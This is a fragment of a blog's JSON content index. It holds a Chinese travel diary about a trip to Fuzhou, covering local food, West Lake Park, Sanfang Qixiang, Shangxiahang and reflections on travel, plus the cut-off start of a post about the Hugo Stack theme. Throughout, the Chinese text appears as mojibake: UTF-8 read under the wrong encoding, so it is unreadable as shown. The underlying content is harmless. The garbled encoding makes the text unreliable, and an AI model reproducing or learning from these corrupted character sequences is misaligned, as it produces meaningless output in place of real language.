åŠ›å‡ºé—¨ç”¨é¤ï¼Œç‚¹äº†â€œé†‰å¾—æ„â€çš„å¤–å–ã€‚å…¶ä¸­é†‰æ’éª¨å’Œè”æè‚‰æ˜¯ä¸¤é“å£°ååœ¨å¤–çš„ç¦å·èœï¼Œæˆ‘è§‰å¾—é†‰æ’éª¨æ˜¯å¾ˆé¦™çš„ï¼Œæ’éª¨çš„è‚¥è‚‰å·²ç»è¢«ç‚¸çš„é…¥è„†ï¼Œæ²¡æœ‰æ²¹è…»ä¹‹æ„Ÿï¼›è”æè‚‰åˆ™å¾ˆä¸€èˆ¬ï¼Œæœ‰ç‚¹ç±»ä¼¼é”…åŒ…è‚‰ï¼Œä¸”è¿‡äºç”œï¼ŒåŠ ä¹‹è‚‰çš„è‚¥ï¼Œä¸å¤§çˆ½å£ã€‚\né¤åç»§ç»­å°æ­‡ä¸€é˜µï¼Œæˆ‘ä»¬å†³å®šå‡ºé—¨å‰å¾€è¥¿æ¹–å…¬å›­ã€‚è¿™æ¬¡æ—…è¡Œçš„è¡Œç¨‹æ˜¯ç´§å¼ çš„ï¼Œè€Œä¸å¯ä¸å»çš„æ™¯ç‚¹æœ‰ä¸‰ä¸ªï¼Œæˆ‘æƒ³ï¼Œå®å¯è®©èº«ä½“ç¨å¾®åŠ³ç´¯ä¸€äº›ï¼Œä¹Ÿä¸èƒ½åœ¨è¿™é‡Œç•™ä¸‹é—æ†¾çš„ã€‚\nå¤œæ™šçš„ç¦å·æ›´åŠ ç¾ä¸½ã€‚è½¦æ°´é©¬é¾™è‡ªä¸å¿…è¯´ï¼Œè¡—è¾¹çš„æ¦•æ ‘å’ŒåŒæ ·é¥­åæ•£æ­¥çš„è¡Œäººï¼Œæ˜¯è¿™åº§åŸå¸‚ç¹å¿™èŠ‚å¥çš„å¾ˆå¥½çš„ä¸­å’Œå‰‚ã€‚æˆ‘åœ¨åŒ—äº¬çœ‹åˆ°çš„æ˜¯çº¯ç²¹çš„å¿™ç¢Œï¼Œåœ¨æ­å·çœ‹åˆ°çš„æ˜¯å¿™ç¢Œä¸å¯‚é™çš„ç»“åˆï¼Œå”¯æœ‰ç¦å·æ˜¯å¿™ç¢Œä¸æ‚ é—²çš„ç»“åˆã€‚æˆ‘å¿…é¡»è¯´çš„æ˜¯ï¼Œä¸€åˆ‡çš„æ‰€è§éƒ½æ˜¯ç‰‡é¢çš„ï¼Œå› è€Œä¸€åˆ‡çš„å¯¹æ¯”éƒ½æ˜¯ä¸»è§‚çš„ï¼Œä½†åŒæ ·ä¸€åˆ‡çš„å¥½æ¶ä¹Ÿéƒ½æ˜¯ä¸»è§‚çš„ï¼Œæˆ‘åœ¨é¥­åæ•£æ­¥çš„åŒºåŒºå‡ åƒæ­¥å†…ï¼Œæ·±åˆ»åœ°ä¸ºç¦å·çš„ç”Ÿæ´»æ°”æ¯æ‰€å¸å¼•äº†ã€‚\nè¥¿æ¹–å…¬å›­æ˜¯ä¸€ç‰‡å°æ°´åŸŸï¼Œä½œä¸ºå›­æ—ï¼Œæ¯”ä¸ä¸Šæ­å·çš„è¥¿æ¹–ï¼Œä¹Ÿæ¯”ä¸ä¸ŠåŒ—äº¬çš„åŒ—æµ·å…¬å›­æˆ–ä»€åˆ¹æµ·ï¼Œä»¥å…¶æœ‰ä¸€ä¸ªç¼ºé™·â€”â€”é£é›…ä¹‹åœ°ä¸å¤šã€‚è¥¿æ¹–è‡ªä¸å¿…è¯´ï¼Œå‡ åƒå¹´æ¥çš„è¿å®¢éªšäººä¼šèšä¹‹åœ°ï¼›çš‡å®¶å›­æ—ä¹Ÿä¸å¿…è¯´ï¼Œæ¯ä¸€ä¸ªåœ°æ–¹éƒ½æ˜¯æœ‰å†…æ¶µçš„ï¼Œåœ¨åœ°å›¾ä¸Šå…‰æ˜¯çœ‹åˆ°æŸä¸€å¤„çš„åå­—ï¼Œä½ ä¾¿è§‰å¾—å®ƒä¸å¯ä¸å»ï¼›æˆ‘è¿›è¡Œè¿™æ ·çš„æ¯”è¾ƒï¼Œä¸æ˜¯å¸Œæœ›å½»åº•å¦å®šç¦å·çš„è¥¿æ¹–å…¬å›­ï¼Œåªæ˜¯è®°å½•ä¸‹æˆ‘è®¤ä¸ºçš„ä¸è¶³ï¼Œè‡ªç„¶ï¼Œå®ƒè¿˜æœ‰æå¥½çš„ã€ç‹¬ç‰¹çš„ä¸€é¢ï¼Œæˆ‘ä¹Ÿæ˜¯è¦è¯´çš„ã€‚\nè¥¿æ¹–å…¬å›­çš„ç‹¬ç‰¹ï¼Œä¹Ÿæ¥è‡ªäºå®ƒçš„é£é›…ä¹‹åœ°ä¸å¤šã€‚å› å…¶ä¸å…·å¤‡å¤§å›­æ—é‚£æ ·ä¸°å¯Œçš„æ™¯ç‚¹ï¼Œå®ƒæˆä¸ºäº†ä¸€ä¸ªå…è´¹çš„ã€ç¯å¢ƒç”šä½³çš„äººæ°‘å…¬å›­ã€‚å…¬å›­å‘¨è¾¹çš„é“è·¯æœ‰å¾ˆå¤šæ‘Šè´©ï¼Œå…¬å›­å†…åˆ°å¤„å¯è§æ•£æ­¥ã€è·³èˆã€å¸¦å­©å­çš„äººç¾¤ï¼Œè¿™æ ·çº¯ç²¹çš„å…¬å›­èº«ä»½ï¼Œæ˜¯ä¸å­˜åœ¨äºæ­å·è¥¿æ¹–è¿™æ ·çš„åœ°æ–¹çš„ã€‚çŸ›ç›¾å°±æ˜¯è¿™æ ·å­è½¬åŒ–ï¼Œè¥¿æ¹–å…¬å›­ä½œä¸ºå›­æ—æ™¯åŒºçš„ç¼ºç‚¹ï¼Œåœ¨è¿™é‡Œè½¬åŒ–ä¸ºå®ƒä½œä¸ºäººæ°‘å…¬å›­çš„ç‹¬ç‰¹çš„ä¼˜ç‚¹äº†ã€‚\nä¸€è¶Ÿé€›ä¸‹æ¥æœ‰å°†è¿‘å››å…¬é‡Œï¼Œå†å›åˆ°å®¾é¦†ï¼Œé‡æ¸©ä¸‹åˆçš„é‚£ç§æ”¾æ¾ä¸å–œæ‚¦ï¼Œåœ¨ç–²æƒ«åŒ…å›´ä¸‹å å…¥æ¢¦ä¹¡ã€‚\næ¬¡æ—¥ éš”å¤©é†’æ¥ï¼Œè…¿è„šä»¿ä½›å·²ç»ä¸å—æ§åˆ¶ï¼Œç„¶è€Œè¿™æ˜¯ä¸€æ¬¡ä¸å¯å¤šå¾—çš„æ—…è¡Œï¼Œåœ¨æˆ‘ä»¬çš„è®¡åˆ’ä¸­ä¸‰åŠä¸ƒå··æ˜¯ä¸å¯ä¸å»çš„ã€‚\næˆ‘ä»¬çš„ä½åœ°ç¦»ä¸‰åŠä¸ƒå··è¿‘å¾—å¾ˆï¼Œèµ°å‡ åˆ†é’Ÿä¾¿åˆ°äº†â€œå—åè¡—â€çŸ³ç‰Œæ¥¼ï¼Œåœ¨ç‰Œæ¥¼å³ä¾§æ˜¯æ—è§‰æ°‘å’Œå†°å¿ƒçš„æ•…å±…ï¼Œæ­¤æ—¥çš„è¡Œç¨‹ä¾¿ä»æ•…å±…å¼€å§‹ã€‚\né—½åœ°çš„å»ºç­‘é£æ ¼å¤§æŠµæ˜¯ç›¸åƒçš„ï¼Œä¸€è¿›é—¨æ˜¯ä¸€ç‰‡å¾ˆå¤§çš„å ‚å…ï¼Œå¤§å…å³ä¾§çš„æˆ¿é—´é™ˆåˆ—ç€ä»‹ç»æ—è§‰æ°‘çš„ä¸€äº›èµ„æ–™ï¼Œå†å¾€åèµ°èƒ½å¤Ÿè§åˆ°æ—è§‰æ°‘çš„å¯å®¤ã€‚å¯å®¤é¢ç§¯ä¸å¤§ï¼Œå…‰çº¿ä¹Ÿä¸æ€ä¹ˆå¥½ï¼Œæ‘†ç€ä¸€å¼ ä¸é•¿çš„åºŠï¼ŒåºŠä¸è¿œå¤„æ˜¯ä¸€å¼ å°æ¡Œã€‚æˆ‘æ­¤å‰è§è¿‡è¾ƒå¤šçš„æ˜¯åŒ—æ–¹çš„çš‡å®¶å¯å®¤ï¼Œå› æ­¤é™¡ç„¶è§åˆ°è¿™æ ·å¹³æ°‘çš„æ ¼å±€ï¼Œæ„Ÿåˆ°æœ‰äº›è®¸å‡„å‡‰ã€‚ç„¶è€Œï¼Œå°±æ˜¯åœ¨è¿™æ ·çš„å°å±‹å­é‡Œï¼Œä½ç€ä¸€è…”çƒ­è¡€çš„ã€æ¸´æœ›è§£æ”¾äººæ°‘çš„å¿—å£«ï¼Œåœ¨åƒé‡Œå¤–çš„äº¬åŸçš„é›…è‡´çš„å¤§å±‹å­å†…ï¼Œä½çš„äººå´æ˜¯é‚£å°å»ºçš„ã€å‰¥å‰Šé˜¶çº§çš„ä»£è¡¨ï¼›è‡ªå¤æœ€é©å‘½çš„é‚£æ‰¹äººï¼Œæ€»æ˜¯ä»¥ä¸é‚£ä¹ˆå¥½çš„æ¡ä»¶å¼€å±€ï¼Œæˆå°±äº†äº‹ä¸šä¹‹åï¼Œè‹¥ä¸å¸¦åŠ¨ç€æ‰€æœ‰çš„äººæ°‘ä¸€åŒå‘å¥½å¤„å»èµ°ï¼Œåˆ™è¿™æ ·çš„å°å±‹å­æ€»è¿˜æœ‰äººä½è¿›å»ã€è¿™æ ·çš„æ—¶å±€æ€»è¿˜æœ‰äººå»æ”¹å˜çš„ã€‚\nå†°å¿ƒçš„å±‹å­è·Ÿæ—è§‰æ°‘çš„å±‹å­ä¼¼ä¹ä¸é€šï¼Œæˆ‘æ²¡æœ‰æ‘¸æ¸…å…·ä½“çš„æ ¼å±€ã€‚å¥¹çš„å±‹å­è¿ç€ä¸ªå°é™¢ï¼Œå°é™¢ä¸å¤§ï¼Œä½†å¾ˆäº®å ‚ï¼Œä½åœ¨è¿™é‡Œæƒ³æ¥å¿ƒæƒ…ä¼šæ˜¯å¾ˆå¥½çš„ã€‚\nèµ°å‡ºä¸¤ä½å…ˆè¾ˆçš„æ•…å±…ï¼Œæˆ‘ä»¬æ‰æ­£å¼è¿›å…¥äº†ä¸‰åŠä¸ƒå··ã€‚\næ­¤è¡Œè¾ƒä»“ä¿ƒï¼Œäº‹å‰çš„æœŸå¾…ä¹Ÿå¹¶ä¸å¾ˆé«˜ï¼Œå› æ­¤æ²¡æœ‰åšå……è¶³çš„åŠŸè¯¾ã€‚å°½ç®¡å‡†å¤‡ä¸è¶³ï¼Œä¸‰åŠä¸ƒå··çš„å¤é£å¤éŸµè¿˜æ˜¯ç»™æˆ‘ä»¬ç•™ä¸‹äº†å¾ˆæ·±çš„å°è±¡ã€‚å—åè¡—æ˜¯ä¸‰åŠä¸ƒå··çš„ä¸­è½´ï¼Œä»çŸ³ç‰Œæ¥¼è¿›å…¥å—åè¡—ï¼Œå·¦è¾¹å¯ä»¥å…¥å··ï¼Œå³è¾¹å¯ä»¥å…¥åŠï¼Œé“è·¯ä¸¤æ—æ˜¯å„ç§å„æ ·çš„åº—é¢ã€‚æˆ‘ä»¬ä¾æ¬¡æ¸¸äº†éƒå®˜å··ã€å¡”å··ã€é»„å··ã€è¡£é”¦åŠã€å®‰æ°‘å··ã€æ–‡å„’åŠã€å®˜å··ï¼Œå› å…‰ç¦„åŠå’Œå‰åº‡å··ç°å·²æ”¹ä¸ºè¡—é“ï¼Œæˆ‘ä»¬åªæ²¿å‰åº‡å··å¾€å›èµ°å»ï¼Œå¹¶æœªå†å»å…‰ç¦„åŠã€‚\nä»æ€»çš„æ¥è¯´ï¼ŒåŠå··çš„æ ¼å±€æ˜¯å¾ˆå¸å¼•äººçš„ã€‚èµ°åœ¨çŸ³æ¿ç –ä¸Šï¼Œçœ¼å‰æ‰€è§æ˜¯èœ¿èœ’çš„ã€å› è€Œæœ›ä¸è§ç»ˆç‚¹çš„å··é“ï¼Œä¸¤è¾¹æ˜¯é—½å¼çš„å¤è€çš„æ¥¼æˆ¿ï¼Œä¼¼ä¹å†å²ä¹‹é£ä»å··å†…æ‰‘é¢å¹æ¥ï¼Œä»è¿™é‡Œå‡ºå‡ºå…¥å…¥è¿‡å¤šå°‘çš„æ–‡äººã€æ˜¾è´µï¼Œåˆæ¿€è¡å›å“ç€å¤šå°‘æ”¹å˜ä¸­å›½çš„å®æ„¿å’Œè±ªè¨€å•Šï¼ä¸”ä¸è®ºå¯¹å†å²çš„è™šæ— çš„éæƒ³ï¼Œå•æ˜¯çœ¼å‰æ‰€ä¿å­˜çš„å»ºç­‘ï¼Œå®ƒä»¬çš„é›•åˆ»å¾—æ— æ¯”ç²¾ç¾çš„æ¢æŸ±å’Œè®¾è®¡å¾—ç›¸å½“å·§å¦™çš„å¸ƒå±€ï¼Œå°±å·²ç»è¶³å¤Ÿéœ‡æ’¼ã€è¶³å¤Ÿä»¤äººé™¶é†‰å…¶ä¸­äº†ã€‚ä¸­å›½æ–‡åŒ–ä¹‹åšé‡åº•è•´æ€»æ˜¯åœ¨è¿™ç§ç»†å¾®ä¹‹å¤„ä½“ç°å‡ºæ¥ï¼Œå¦‚ä»Šå´å†éš¾è§åˆ°è¿™æ ·çš„ç²¾ç»†çš„å»ºç­‘å·¥è‰ºï¼Œä»ä¸Šå±‚å»ºç­‘æ¥è¯´åº”è¯¥æ˜¯æµ®èºçš„å¿«èŠ‚å¥ç¯å¢ƒå¯¹å¤è€çš„åŒ å¿ƒçš„ä¸€ç§ä¾µèš€ï¼Œä»ç»æµåŸºç¡€ä¸Šåˆ™æ˜¯ç”Ÿäº§å…³ç³»å’Œèµ„æœ¬å¸‚åœºå·²ç»ä¸å®¹è®¸å¹¿æ³›è€ƒç©¶çš„é›•ç¢äº†ã€‚\nåœ¨æ¸¸è§ˆçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ¥åˆ°æ°¸å’Œé±¼ä¸¸åº—ï¼Œæ‰“ç®—å°è¯•ä¸€ä¸‹è¿™é¡¹ä¹…è´Ÿç››åçš„å°åƒã€‚æˆ‘ä¸ªäººæ˜¯å¤±æœ›çš„ï¼Œé±¼ä¸¸çš„æ±¤æœ‰ä¸€ç§æ·¡æ·¡çš„è‡­å‘³ï¼ˆå¯¹æˆ‘æ¥è¯´ï¼‰ï¼Œä»¿ä½›æ˜¯åˆ¶ä½œå’¸é±¼çš„è¿‡ç¨‹ä¸­æ•£å‘çš„é‚£ç§å‘³é“ï¼Œä»¤äººä¸å¤§æ„‰å¿«ï¼›é±¼ä¸¸æœ¬èº«æ²¡æœ‰å¤ªå¤šçš„ç¼ºç‚¹ï¼Œä½†æ— è®ºå£æ„Ÿå’Œå‘³é“éƒ½åªæ˜¯ä¸­è§„ä¸­çŸ©ï¼›æˆ‘ä¸èƒ½å¦å®šè¿™é¡¹é£Ÿç‰©ï¼Œåªèƒ½å¦å®šæ°¸å’Œé±¼ä¸¸ï¼Œå‡å¦‚ä¸‹æ¬¡è¿˜æœ‰æœºä¼šæ¥ç¦å·ï¼Œå…¶ä»–åœ°æ–¹çš„é±¼ä¸¸ä»æ˜¯å€¼å¾—ä¸€è¯•çš„ã€‚\nç»“æŸäº†ä¸‰åŠä¸ƒå··çš„æ¸¸è§ˆï¼Œæ—¶é—´åªåˆ°ä¸­åˆã€‚æˆ‘ä»¬å†³å®šæŠŠåŸè®¡åˆ’ç¬¬ä¸‰å¤©æ‰å»çš„ä¸Šä¸‹æ­æŒªåˆ°ç¬¬äºŒå¤©å®Œæˆï¼Œå¹¶å°†åŸè®¡åˆ’ç¬¬ä¸‰å¤©æ™šä¸Šçš„è½¦ç¥¨æ”¹ç­¾åˆ°ç¬¬ä¸‰å¤©ä¸‹åˆï¼Œä»¥é¿å…ç¬¬ä¸‰å¤©èƒŒç€æ²‰é‡çš„è´Ÿæ‹…æ¸¸è§ˆè€Œé€ æˆè¿‡å¤šçš„åŠ³ç´¯ã€‚\nä»ä¸œè¡—å£åœ°é“ç«™ä¹˜ååœ°é“è‡³è¾¾é“ç«™ï¼Œåœ¨åœ°é“é™„è¿‘å“å°äº†ç¦å·çš„æåŒ–â€”â€”å…¶å®å°±æ˜¯å®¶ä¹¡çš„é¢çº¿ã€‚æˆ‘è®¤ä¸ºæåŒ–è¿™ç§é£Ÿç‰©çš„ä¸Šé™æ˜¯å¾ˆé«˜çš„ï¼Œå› ä¸ºæœ‰å¾ˆå¤šçš„é£Ÿæå¯ä»¥ä¸ä¹‹åŒç…®ï¼Œä¸è¿‡æˆ‘ä»¬åƒåˆ°çš„æ˜¯æ¸…æ±¤æåŒ–ï¼Œå”¯ä¸€çš„ä½èœæ˜¯ä¸€å å¤è‚‰ï¼Œåªèƒ½åº†å¹¸åº—å®¶çš„æ±¤åšå¾—è¿˜ç®—çˆ½å£ï¼Œå¦‚æœè·Ÿé±¼ä¸¸çš„æ±¤ä¸€æ ·ï¼Œææ€•çœŸè¦ä»¤æˆ‘æ¬²å“­æ— æ³ªäº†ã€‚\né¥­åæ­¥è¡Œå‡ åˆ†é’Ÿå³å¯æ¥åˆ°ä¸Šä¸‹æ­å†å²é£è²ŒåŒºï¼Œè¿™é‡Œæ˜¯ä¸€ç‰‡ç±»ä¼¼ä¸‰åŠä¸ƒå··çš„å¤å»ºç­‘åŒºï¼Œè¢«ä¸¤æ¡ä¸»è¦é“è·¯â€”â€”ä¸Šæ­è·¯å’Œä¸‹æ­è·¯â€”â€”åˆ†ä¸ºäº†ä¸‰å—åŒºåŸŸï¼Œæˆ‘ä»¬å†³å®šä»ä¸Šæ­è·¯è¿›å…¥ï¼Œä»ä¸‹æ­è·¯ç¦»å¼€ã€‚\næ¼«æ­¥åœ¨ä¸Šä¸‹æ­å†…ï¼Œæˆ‘æ„Ÿåˆ°ç¦å·è¿™åº§åŸå¸‚çš„åº•è•´è¿˜æ˜¯æµ“åšçš„ã€‚ä»æ—§æ˜¯èœ¿èœ’çš„è¡—é“ï¼Œæ²¡æœ‰å··å†…é‚£ç§å¼€é˜”æ´»æ³¼çš„æ°”æ¯ï¼Œæ›´æ¥è¿‘åŠçš„é‚£ç§ç«¯åº„å¨ä¸¥ã€‚é“è·¯æœ‰å®½çª„çš„å˜åŠ¨ï¼Œè¿™æ˜¯ä¸Šä¸‹æ­ä¸åŒäºä¸‰åŠä¸ƒå··çš„ä¸€ç‚¹ï¼Œåœ¨æœ€çª„çš„åœ°æ–¹ä»…å®¹ä¸€äººé€šè¿‡ï¼Œæœ€å®½çš„åœ°æ–¹åˆåˆ†æ˜æ˜¯ä¸€å¤„å°çš„åˆé™¢ã€‚åº”è¯¥è¯´ï¼Œä¸Šä¸‹æ­æ˜¯å°†æˆ‘è§è¿‡çš„é—½å—ä¹¡æ‘é‚£ç§è¡—é“å¸ƒå±€åŒç¦å·åŠå··çš„å»ºç­‘èåˆåœ¨ä¸€èµ·ï¼Œä¸”è¿™äº›å»ºç­‘éƒ½æ˜¯å»ºé€ æ°´å¹³å¾ˆé«˜çš„ã€ä¿å­˜è¾ƒå¥½çš„å»ºç­‘ï¼Œå› æ­¤ä»ç©ºé—´å’Œè§†è§‰ä¸Šå¸¦ç»™äººçš„ä½“éªŒå°±æ˜¯æ—¢æ¸©é¦¨åˆåº„é‡ï¼Œæ—¢å¤è€åˆäº²åˆ‡ã€‚\nåœ¨ä¸Šæ­è·¯å’Œä¸‹æ­è·¯äº¤ä¼šçš„åœ°æ–¹ï¼Œæˆ‘ä»¬çœ‹åˆ°çš„æ˜¯å²åº·å‚å·çš„æ—§å€ï¼Œè¿™æ˜¯ä¸€ä¸ªè¥¿æ´‹å‚ä¸“å–é“ºï¼Œå»ºç­‘å¹¶ä¸é«˜å¤§ï¼Œä½†å¤–ç«‹é¢çš„é…è‰²å’ŒçŸ³æçš„é›•åˆ»éƒ½åšå¾—ç»†è‡´å®Œç¾ã€‚åœ¨è¿™é‡Œé‡åˆ°ä¸€ä½ç¦å·è€ä¼¯ï¼Œä»–å‘æˆ‘ä»¬æŒ‡å‡ºå‚å·è§’è½çš„ä¸€é¢—æ‚¬ç©ºè€Œç”Ÿçš„æ¦•æ ‘ï¼Œæ‚¬ç©ºè€Œç”Ÿï¼è€ä¼¯è¯´ï¼Œè¿™æ¦•æ ‘ä¾é™„åœ¨å»ºç­‘ä¸Šï¼Œç”Ÿå‘½åŠ›è¿˜éå¸¸æ—ºç››ï¼Œè¶³è§å±‹ä¸»äººå¯¹è¿™é¢—æ ‘çš„å–œçˆ±å’Œç…§æ–™ï¼Œè¿™ä¹Ÿæ˜¯ç¦å·çš„ä¸€å¤„ç‰¹è‰²ã€‚æˆ‘è¦æ„Ÿè°¢è¿™ä½äº²åˆ‡çš„è€ä¼¯ï¼Œä»–è®©æˆ‘å¯¹â€œæ¦•åŸâ€çš„â€œæ¦•â€å­—ä½“ä¼šæ›´æ·±äº†ä¸€æ­¥ã€‚\næ‚¬ç©ºè€Œç”Ÿçš„æ¦• ä¸‹æ­è·¯æ¯”ä¸Šæ­è·¯æ›´åŠ å¼€é˜”ï¼Œæœ‰ç‚¹åƒå—åè¡—ï¼Œé“è·¯ä¸¤æ—æ˜¯ä¸€äº›åº—é¢ã€‚è€å»ºç­‘èƒ½å¤Ÿåœ¨ç°ä¸–å‘å…‰å‘çƒ­ï¼Œè¿™æ˜¯ä¸€ä»¶ä»¤äººé«˜å…´çš„äº‹ï¼›æ²¡èƒ½è¿›å…¥åˆ°è¿™é‡Œçš„é¤é¦†ç”¨ç”¨é¤ï¼Œå¯ä»¥ç®—ä½œä¸€ç‚¹å°é—æ†¾ã€‚\nä¸‹æ­è·¯è¿˜è¿é€šç€ä¸€ç‰‡å°å¤©åœ°ã€‚ä»ä¸€æ¡å‚ç›´äºä¸Šä¸‹æ­è·¯çš„å°é“å‡ºå»ï¼Œèƒ½å¤Ÿåˆ°å¼ çœŸå›ç¥ ï¼Œé¦™ç«è›®æ—ºç››ã€‚å¼ çœŸå›ç¥ ä¸´ç€ä¸€æ¡æ²³æµï¼Œæ²³æµä¸ä¸‹æ­è·¯æ˜¯å¹³è¡Œçš„ï¼›å¦‚æœè¯´ä¸Šä¸‹æ­æ˜¯å¤å»ºçš„è¡—åŒºï¼Œåˆ™å¼ çœŸå›ç¥ è¿™ä¸€ä¾§æ˜¯ä¸€ç‰‡å°çš„æ°´ä¹¡ï¼›äº‹å®ä¸Šï¼Œè¿™é‡Œçš„æ ¼å±€è·Ÿé—½å—çš„æ‘è½æ˜¯ç›¸ä¼¼çš„ï¼Œä¸´æ°´å¤„æ€»æ˜¯å®—æ•™æˆ–å®—æ—çš„åœºæ‰€ï¼Œè€Œå¾€å†…æ‰æ˜¯é€šè¾¾çš„å··é“å’Œæˆ¿å±‹çš„ç¾¤è½ã€‚\nå°é€›äº†ä¸€åœˆï¼Œä»ä»ä¸‹æ­è·¯ç¦»å¼€è¿™ç‰‡è¡—åŒºã€‚å›åˆ°è½¦æµç¹å¿™çš„ä¸»è·¯ä¸Šï¼Œé€‚æ‰çš„æ¸¸è§ˆæç„¶å¦‚æ¢¦ï¼›è¿™æ ·çš„åœ°æ–¹çœŸä»¤äººé™¶é†‰ï¼Œæ‹¥æœ‰è¿™æ ·åœ°æ–¹çš„ç¦å·æ˜¯å¯çˆ±çš„ã€å¸å¼•äººçš„ã€‚\nå›åˆ°å®¾é¦†ï¼Œè¿˜æ˜¯é‚£ç†Ÿæ‚‰çš„ä»å¿ƒé‡Œå‡èµ·çš„è½»æ¾ä¹‹æ„Ÿï¼Œæˆ‘ä»¬ä¼‘æ¯åˆ°äº†æ™šä¸Šã€‚\nåƒå®Œæ±‰å ¡ç‹çš„å¤–å–ä¹‹åï¼Œæˆ‘ä»¬å‡ºé—¨å»é€›è¾¾æ˜ç¾é£Ÿè¡—ã€‚è¿™æ ·çš„å…ˆåƒåé€›ç¾é£Ÿè¡—çš„å®‰æ’å¯ä»¥è¯´æ˜¯æ­¤è¡Œæœ€ç¦»è°±çš„è¡Œä¸ºâ€”â€”çºµç„¶ç¾é£Ÿè¡—æœ‰ç³ç…æ»¡ç›®çš„é£Ÿç‰©ï¼Œæˆ‘ä»¬å·²ç»åƒä¸ä¸‹ä»€ä¹ˆä¸œè¥¿äº†ï¼ä¸è¿‡ï¼Œæœ€æœ‰çƒŸç«æ°”çš„åœ°æ–¹ï¼Œæ€»æ˜¯ä¸é£Ÿç‰©æœ‰å…³ï¼Œè¾¾æ˜ç¾é£Ÿè¡—çš„çº¯ç²¹çš„çƒŸç«æ°”ï¼Œå¯ä»¥è¯´æ˜¯ä¸ºæœ¬æ¬¡æ—…è¡Œç”»ä¸‹äº†ä¸€ä¸ªå¾ˆå¥½çš„å¥ç‚¹ã€‚\nå°¾æ—¥ æœ€åä¸€å¤©ï¼Œå·²ç»æ²¡æœ‰ä»»ä½•çš„å®‰æ’ã€‚è¿˜æ˜¯é åœ¨å®¾é¦†çš„åºŠä¸Šï¼Œè€³å¬ç€æ–°é—»çš„æ’­æŠ¥ï¼Œå›å‘³ç€ä¸‰å¤©çš„è¡Œç¨‹ã€‚æˆ‘æƒ³ï¼Œæ—…è¡Œå¹¶ä¸æ˜¯ä¸€ç§èº«å¿ƒä¸Šçš„æ”¾æ¾ï¼Œè€Œç®€ç›´æ˜¯ä¸€ç§èº«å¿ƒä¸Šçš„æ‹‰ç»ƒã€‚å‡¡æ˜¯è¦è€ƒè™‘æ—¶é—´å’Œç»æµæˆæœ¬çš„æ—…è¡Œï¼Œæ˜¯æ ¹æœ¬ä¸èƒ½æ”¾æ¾çš„ï¼Œè¦åœ¨ä¸é‚£ä¹ˆèˆ’é€‚çš„æ—…èˆå†…ä¼‘æ†©ã€åœ¨æœ‰é™çš„æ—¶é—´å†…ä¸ç•™é—æ†¾åœ°é€›å®Œå¥½å‡ å¤„æ™¯ç‚¹ï¼Œå«åšä»€ä¹ˆæ”¾æ¾å‘¢ï¼Ÿæˆ‘æƒ…æ„¿æŠŠè¿™ç§â€œæ”¾æ¾â€å«åšæ˜¯ä¸€ç§â€œè½¬ç§»â€ï¼Œå®ƒæ˜¯å°†å¹³æ—¥é‡ŒæŸ´ç±³æ²¹ç›çš„ã€å­¦ä¹ å·¥ä½œçš„åŠ³ç´¯ï¼Œè½¬ç§»åˆ°å››å¤„æ¸¸èµ°çš„åŠ³ç´¯ä¸Šäº†ã€‚è¿™æ ·çš„è½¬ç§»ï¼Œä»å…¨å±€ä¸Šæ¥è¯´ä¸æ˜¯æ”¾æ¾ï¼Œå› ä¸ºæ ¹æœ¬æ²¡æœ‰æ”¾æ¾ï¼Œä¹ƒè‡³äºæ›´åŠ ç–²æƒ«äº†ï¼Œä½†ä»å±€éƒ¨ä¸Šæ¥è¯´ï¼Œæ˜¯å¾ˆå¤§çš„æ”¾æ¾ï¼Œæ˜¯ç”Ÿæ´»ä¸­ä¸»è¦çŸ›ç›¾çš„ä¸€ç§è½¬åŒ–ï¼Œå½“æˆ‘ä»¬ä»å››å¤„æ¸¸èµ°å›åˆ°æŒ‰éƒ¨å°±ç­çš„åå®šä¸å­¦ä¹ ï¼Œä»¿ä½›æ˜¯åšè¿‡äº†ä¸€åœºäº”å…‰åè‰²çš„å¤§æ¢¦ï¼ŒåŸæœ¬å·²ç»æ·±æ„Ÿæ¯ç‡¥çš„ç”Ÿæ´»èŠ‚å¥åˆå˜å¾—äº²åˆ‡ä¸æ´»æ³¼èµ·æ¥ã€‚\nåŸºäºå­¦ç”Ÿçš„ç”Ÿæ´»æ¥è¯´ï¼Œæˆ‘æ˜¯ä¸å¤§å–œæ¬¢æ—…è¡Œçš„ï¼Œå› ä¸ºå¤§å­¦ç”Ÿæ˜¯æœ€èˆ’é€‚ã€è‡ªç”±çš„ç¾¤ä½“ï¼Œå¹³æ—¥é‡Œé¢ä¸´çš„è‹¦æ¼å¹¶ä¸é‚£ä¹ˆå¤šï¼›ä½†å°†æ¥è¿›å…¥å·¥ä½œï¼Œå°±è¯´ä¸å‡†æˆ‘å¯¹æ—…è¡Œçš„æ€åº¦ï¼›æˆ‘æƒ³ï¼Œéšç€å·¥ä½œçš„å‹åŠ›æºæºä¸ç»åœ°æ¥ï¼Œä¸å¥½å‹å‡ºé—¨æ—…è¡Œè¿™æ ·çš„çŸ›ç›¾çš„è½¬åŒ–åŠæ³•ï¼Œåº”è¯¥æ˜¯æœ‰å¿…è¦ç»å¸¸ä½¿ç”¨çš„ï¼Œä¸è¿‡ä¸èƒ½ä¸€æ¬¡æ€§åœ°é‚£ä¹ˆç´¯å°±æ˜¯äº†ã€‚\n","date":"2022-01-20T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E7%A6%8F%E5%B7%9E%E6%B8%B8%E8%AE%B0/","title":"ç¦å·æ¸¸è®°"},{"content":"è¿‘æœŸä¸€å¥½å‹æ­å»ºåšå®¢ï¼Œä½¿ç”¨äº†è·Ÿæˆ‘ä¸€æ ·çš„ Hugo Stackä¸»é¢˜ ï¼Œåœ¨è‡ªå®šä¹‰çš„è¿‡ç¨‹å½“ä¸­ç—›ä¸æ¬²ç”Ÿã€‚æˆ‘æ‰å‘ç°JimmyCaiå¤§ä½¬å·²ç»æŠŠè¿™ä¸ªä¸»é¢˜æ›´æ–°äº†å¥½å‡ ç‰ˆï¼Œæ— æ€ªä¹æˆ‘æ—§æœ‰çš„ä¸€äº›ç»éªŒå·²ç»ä¸èµ·ä½œç”¨äº†ã€‚\nä»Šå¤©ä¸‹è½½äº† 3.6.0 ç‰ˆæœ¬çš„ Release ï¼Œæ‰“ç®—è¿™å‡ 